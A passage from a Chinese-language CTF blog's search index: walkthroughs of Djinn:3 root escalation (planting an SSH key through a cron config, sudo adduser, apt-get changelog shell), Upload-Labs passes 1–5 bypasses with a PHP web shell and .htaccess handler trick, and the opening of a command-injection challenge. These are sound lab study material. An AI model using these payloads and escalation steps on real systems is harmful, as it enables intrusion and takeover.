+<img src="Djinn:3/image-20200721191529580.png" alt="image-20200721191529580" style="zoom:50%;" />
+
+
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看一下用户列表（其中jason和stdout是后来创建的）</p>
+<img src="Djinn:3/image-20200721192149525.png" alt="image-20200721192149525" style="zoom:50%;" />
+
+<p>找一下<code>saint</code>用户的文件</p>
+<p><code>find / -user saint -type f 2&gt;/dev/null</code></p>
+<img src="Djinn:3/image-20200721192240006.png" alt="image-20200721192240006" style="zoom:50%;" />
+
+<p>下载下来反编译(uncompyle6)之后</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, json</span><br><span class="line"><span class="keyword">from</span> glob <span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime <span class="keyword">as</span> dt</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfigReader</span>:</span></span><br><span class="line">    config = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_config</span>(<span class="params">path</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Reads the config file</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        config_values = &#123;&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                config_values = json.load(f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                print(<span class="string">&quot;Couldn&#x27;t properly parse the config file. Please use properl&quot;</span>)</span><br><span class="line">                sys.exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">del</span> e</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> config_values</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_config_path</span>():</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Set the config path</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        files = glob(<span class="string">&#x27;/home/saint/*.json&#x27;</span>)</span><br><span class="line">        other_files = glob(<span class="string">&#x27;/tmp/*.json&#x27;</span>)</span><br><span class="line">        files = files + other_files</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(files) &gt; <span class="number">2</span>:</span><br><span class="line">                files = files[:<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file1 = os.path.basename(files[<span class="number">0</span>]).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">                file2 = os.path.basename(files[<span class="number">1</span>]).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> file1[(-<span class="number">2</span>)] == <span class="string">&#x27;config&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> file2[(-<span class="number">2</span>)] == <span class="string">&#x27;config&#x27;</span>:</span><br><span class="line">                        a = dt.strptime(file1[<span class="number">0</span>], <span class="string">&#x27;%d-%m-%Y&#x27;</span>)</span><br><span class="line">                        b = dt.strptime(file2[<span class="number">0</span>], <span class="string">&#x27;%d-%m-%Y&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> b &lt; a:</span><br><span class="line">                    filename = files[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    filename = files[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> filename</span><br><span class="line"><span class="comment"># okay decompiling a.pyc</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> configuration <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.ftpconn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.sshconn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Main function</span></span><br><span class="line"><span class="string">    Cron job is going to make my work easy peasy</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    configPath = ConfigReader.set_config_path()</span><br><span class="line">    config = ConfigReader.read_config(configPath)</span><br><span class="line">    connections = checker(config)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;FTP&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">        ftpcon(config[<span class="string">&#x27;FTP&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;SSH&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">            sshcon(config[<span class="string">&#x27;SSH&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;URL&#x27;</span> <span class="keyword">in</span> connections:</span><br><span class="line">                sync(config[<span class="string">&#x27;URL&#x27;</span>], config[<span class="string">&#x27;Output&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>大意就是在<code>/tmp</code>目录下创建一个<code>day-month-year.config.json</code>的文件，文件里面写<code>URL:xxxx; Output:xxx</code>，就会把URL指向的文件写入到Output中</p>
+<p>那把ssh写进去</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="attr">&quot;URL&quot;</span>:<span class="string">&quot;http://192.168.2.143/id_rsa.pub&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;Output&quot;</span>:<span class="string">&quot;/home/saint/.ssh/authorized_keys&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后等一会儿就可以使用saint账户免密登录了</p>
+<img src="Djinn:3/image-20200721194614312.png" alt="image-20200721194614312" style="zoom:50%;" />
+
+
+
+<p>查看一下<code>sudo -l</code></p>
+<img src="Djinn:3/image-20200721194709463.png" alt="image-20200721194709463" style="zoom:50%;" />
+
+<p>那就增加一个root用户组的账户</p>
+<p><code>saint@djinn3:~$ sudo -u root /usr/sbin/adduser --gid 0 stdin</code></p>
+<img src="Djinn:3/image-20200721195016035.png" alt="image-20200721195016035" style="zoom:50%;" />
+
+<p>但是并没有root权限，看一下<code>/etc/sudoer</code></p>
+<img src="Djinn:3/image-20200721195110455.png" alt="image-20200721195110455" style="zoom:50%;" />
+
+<p>创建一个jason用户，他就可以使用<code>(root)apt-get</code></p>
+<img src="Djinn:3/image-20200721195258743.png" alt="image-20200721195258743" style="zoom:50%;" />
+
+
+
+<p>输入<code>jason@djinn3:/home/saint$ sudo -u root /usr/bin/apt-get changelog bash</code></p>
+<img src="Djinn:3/image-20200721195556621.png" alt="image-20200721195556621" style="zoom:50%;" />
+
+<p>然后就得到了一个root的shell</p>
+<img src="Djinn:3/image-20200721195634576.png" alt="image-20200721195634576" style="zoom:50%;" />
 
 ]]></content>
       <categories>
@@ -1906,13 +1906,67 @@
   <entry>
     <title>Upload-Labs 1-5</title>
     <url>//Upload-Labs01.html</url>
-    <content><![CDATA[<a id="more"></a>]]></content>
+    <content><![CDATA[<p><code>Upload-labs</code>的记录</p>
+<a id="more"></a>
+
+<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>使用docker直接搭建环境</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130141102104.png" alt="image-20201130141102104"></p>
+<p>启动docker之后，需要在<code>/var/www/html</code>目录下新建一个<code>upload</code>文件夹，并且将所有权给<code>www-data</code></p>
+<h2 id="pass01"><a href="#pass01" class="headerlink" title="pass01"></a>pass01</h2><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里只使用了前端检测，后端没有进行判断，所以可以通过<strong>抓包/修改js代码</strong>等方法绕过</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>写一个<code>1.jpg</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130141827866.png" alt="image-20201130141827866"></p>
+<p>上传，抓包，修改文件名称为<code>1.php</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130141935932.png" alt="image-20201130141935932"></p>
+<p>访问<code>http://ip:port/upload/1.php?c=id</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130142347530.png" alt="image-20201130142347530"></p>
+<h2 id="pass02"><a href="#pass02" class="headerlink" title="pass02"></a>pass02</h2><h3 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;</span><br><span class="line">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]            </span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用了<code>Content-Type</code>判断文件是否是图片，可以通过修改<code>Content-Type</code>绕过</p>
+<h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>修改<code>Content-Type</code>为目标支持的格式，这里修改为<code>image/jpeg</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130142739528.png" alt="image-20201130142739528"></p>
+<p>访问<code>http://ip:port/upload/2.php?c=whoami</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130142909834.png" alt="image-20201130142909834"></p>
+<h2 id="pass03"><a href="#pass03" class="headerlink" title="pass03"></a>pass03</h2><h3 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $img_path &#x3D; UPLOAD_PATH.&#39;&#x2F;&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里判断了后缀名<code>.asp .aspx .php .jsp </code>后缀的文件不能上传</p>
+<p>由于文件名采用了<code>time+random</code>形式使用<code>.htaccess .php.ini .user.ini</code>这些绕过</p>
+<p>所以使用<code>php3 php4 php5</code>等后缀名绕过，但是需要在<code>/etc/apache2/apache2.conf</code>里面包含<code>php5.conf</code>文件，本环境没有包含，仅作为参考</p>
+<p>如果目标是<code>Windows</code>系统，还可以通过大小写绕过。</p>
+<h3 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h3><p>修改文件后缀名为<code>php5</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130144348250.png" alt="image-20201130144348250"></p>
+<p>访问文件，由于没有在<code>apache2</code>中配置，所以无法被解析。</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130144451391.png" alt="image-20201130144451391"></p>
+<h2 id="pass04"><a href="#pass04" class="headerlink" title="pass04"></a>pass04</h2><h3 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里过滤了很多后缀名，但是没有把上传的文件重命名，所以可以采用<code>.htaccess .php.ini .user.ini</code>绕过</p>
+<p>仔细看，会发现<code>array</code>里面的后缀名有些写错了，例如<code>php1 ==&gt; .php1</code></p>
+<h3 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h3><p>上传<code>.htaccess</code>:</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">xxx</span>&quot;&gt;</span>  </span><br><span class="line">		SetHandler application/x-httpd-php  </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后上传<code>xxx</code>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	system(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">	phpinfo(); </span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://ip:port/upload/xxx?c=pwd</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130150821889.png" alt="image-20201130150821889"></p>
+<h2 id="pass05"><a href="#pass05" class="headerlink" title="pass05"></a>pass05</h2><h3 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样是黑名单，但是这次加上了<code>.htaccess</code>，本想通过<code>.user.ini</code>绕过，但是考虑到<code>./upload</code>目录下没有php文件，就算上传了也无从触发。</p>
+<p>对比和上面的代码，不只是过滤了<code>.htaccess</code>，而且没有转换成小写</p>
+<p><code>diff</code> 命令可以查看两者的区别</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130151535702.png" alt="image-20201130151535702"></p>
+<h3 id="绕过-4"><a href="#绕过-4" class="headerlink" title="绕过"></a>绕过</h3><p>绕过的方法就很简单了——大小写绕过</p>
+<p>但是这种方法只在windows下有效，由于我的环境是Linux，所以无法触发这个。</p>
+]]></content>
       <categories>
         <category>CTF</category>
         <category>upload-labs</category>
       </categories>
       <tags>
         <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -2378,6 +2432,37 @@
       </tags>
   </entry>
   <entry>
+    <title>ACTF2020_新生赛_Exec</title>
+    <url>//buu_ACTF2020Exec.html</url>
+    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
+<a id="more"></a>
+
+
+
+<p>点进靶机界面如下</p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213540334.png" alt="image-20200809213540334" style="zoom:50%;" />
+
+<p>结合题目名，猜测是命令执行</p>
+<p>输入<code>l | ls</code></p>
